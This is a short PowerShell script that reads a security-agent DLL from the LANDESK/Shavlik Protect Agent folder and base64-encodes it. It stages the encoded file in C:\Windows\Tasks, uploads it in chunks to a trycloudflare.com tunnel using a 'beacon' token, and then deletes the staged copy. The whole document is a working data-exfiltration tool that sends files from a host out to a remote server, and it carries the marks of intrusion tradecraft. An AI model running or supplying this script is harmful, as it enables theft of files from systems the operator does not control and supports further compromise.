$Tunnel = "https://taxes-surprised-immediately-transportation.trycloudflare.com"
$DllPath = "C:\Program Files\LANDESK\Shavlik Protect Agent\STAgentFramework.dll"
$B64Path = "C:\Windows\Tasks\stf_b64.txt"

# Read DLL, base64 encode, write to temp file
$bytes = [System.IO.File]::ReadAllBytes($DllPath)
$b64 = [System.Convert]::ToBase64String($bytes)
[System.IO.File]::WriteAllText($B64Path, $b64, [System.Text.Encoding]::ASCII)
Write-Host "Encoded $($bytes.Length) bytes -> $($b64.Length) chars"

# Chunk and upload (500KB chunks to stay safe)
$chunkSize = 500000
$totalChunks = [Math]::Ceiling($b64.Length / $chunkSize)
Write-Host "Uploading $totalChunks chunks..."

for ($i = 0; $i -lt $totalChunks; $i++) {
    $start = $i * $chunkSize
    $len = [Math]::Min($chunkSize, $b64.Length - $start)
    $chunk = $b64.Substring($start, $len)
    $append = $i -gt 0
    $body = @{name="STAgentFramework.dll";data=$chunk;append=$append} | ConvertTo-Json -Compress
    
    try {
        $r = iwr -Uri "$Tunnel/api/upload" -Method POST -Body $body -ContentType "application/json" -UseBasicParsing -Headers @{"x-beacon-token"="mothership-beacon-2024"}
        Write-Host "  Chunk $($i+1)/$totalChunks done"
    } catch {
        Write-Host "  Chunk $($i+1) failed: $_"
        exit 1
    }
}

# Clean up temp file
Remove-Item $B64Path -Force -ErrorAction SilentlyContinue
Write-Host "=== Upload complete ==="
